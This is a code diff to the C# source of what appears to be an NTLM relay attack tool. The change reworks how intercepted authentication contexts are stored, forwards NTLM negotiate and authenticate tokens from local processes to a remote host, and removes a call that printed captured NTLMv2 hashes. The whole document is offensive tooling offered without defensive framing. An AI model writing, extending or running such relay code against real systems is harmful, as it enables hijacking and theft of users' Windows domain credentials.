@@ -194,18 +194,23 @@ namespace ntlmrelaynet {
             var token = NtlmAuthenticationToken.Parse(relayRequest.Token);
             BitseryObject lsaResponse;
             bool doPassive = DoPassiveMode(relayRequest.ProcessID);
+            NtlmAuth authContext;
+
+            if (!activeContext.ContainsKey(relayRequest.Context)){
+                authContext = new NtlmAuth(relayRequest.Context, !doPassive ? new NtlmRelayChallengeResponse(host, port) : null);
+                activeContext[authContext.Context] = authContext;
+            } else {
+                authContext = activeContext[relayRequest.Context];
+            }
 
             if (token is NtlmNegotiateAuthenticationToken) {
-
-                var newAuthContext = new NtlmAuth(relayRequest.Context, !doPassive ? new NtlmRelayChallengeResponse(host, port) : null);             
-                activeContext[newAuthContext.Context] = newAuthContext;
-
+               
                 if (!doPassive) {
-                    var relayResponse = newAuthContext.Relayer.GetChallengeToken(relayRequest.Token);
+                    var relayResponse = authContext.Relayer.GetChallengeToken(relayRequest.Token);
 
                     if (relayResponse.Length > 0) {
                         lsaResponse = new RelayChallengeResponse(relayResponse);
-                        newAuthContext.Challenge = (NtlmChallengeAuthenticationToken)NtlmAuthenticationToken.Parse(relayResponse);
+                        authContext.Challenge = (NtlmChallengeAuthenticationToken)NtlmAuthenticationToken.Parse(relayResponse);
                     } else {
                         Console.WriteLine($"[!] Failed to relay NTLM Type 1 and get challenge");
                         lsaResponse = new RelayChallengeResponse(RelayStatus.Passive);
@@ -223,7 +228,6 @@ namespace ntlmrelaynet {
 
                 } else {
                    
-                    var authContext = activeContext[relayRequest.Context];
                     activeContext.Remove(relayRequest.Context);
                     authContext.Authentication = ntlmAuthenticate;
                     bool? success = null;
@@ -231,7 +235,6 @@ namespace ntlmrelaynet {
 
                     if (!doPassive && !string.IsNullOrEmpty(ntlmAuthenticate.UserName)) {
                         success = authContext.Relayer.SendAuthenticateToken(relayRequest.Token);
-                        PrintNTLMv2(authContext, relayRequest.Process.ProcessName, success);
 
                         UserInfo userInfo = new UserInfo(ntlmAuthenticate.UserName, ntlmAuthenticate.Domain);
 
@@ -258,12 +261,7 @@ namespace ntlmrelaynet {
 
             } else if (token is NtlmChallengeAuthenticationToken challengeToken) {
 
-                if (activeContext.ContainsKey(relayRequest.Context)) {
-                    activeContext[relayRequest.Context].Challenge = challengeToken;
-                } else {
-                    Console.WriteLine("[!] Got passive NTLM challenge message without a valid context");
-                }
-
+                authContext.Challenge = challengeToken;
                 lsaResponse = new RelayChallengeResponse(RelayStatus.Passive);
 
             } else {
